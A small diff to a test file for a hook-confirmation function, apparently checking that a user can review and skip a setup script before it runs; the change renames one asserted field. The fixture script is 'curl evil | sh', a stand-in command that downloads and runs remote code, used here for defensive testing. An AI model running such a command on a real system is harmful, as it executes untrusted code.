@@ -514,7 +514,7 @@ describe('ensureHooksConfirmed', () => {
     await vi.waitFor(() => expect(pending).toHaveLength(1))
     expect(pending[0].data.scriptContent).toBe('curl evil | sh')
     expect(pending[0].data.scriptKind).toBe('setup')
-    expect(pending[0].data.createdBranchReview).toBe(true)
+    expect(pending[0].data.skippedSetupReview).toBe('created-branch')
     pending[0].resolve('skip')
 
     await expect(promise).resolves.toEqual({ decision: 'skip' })
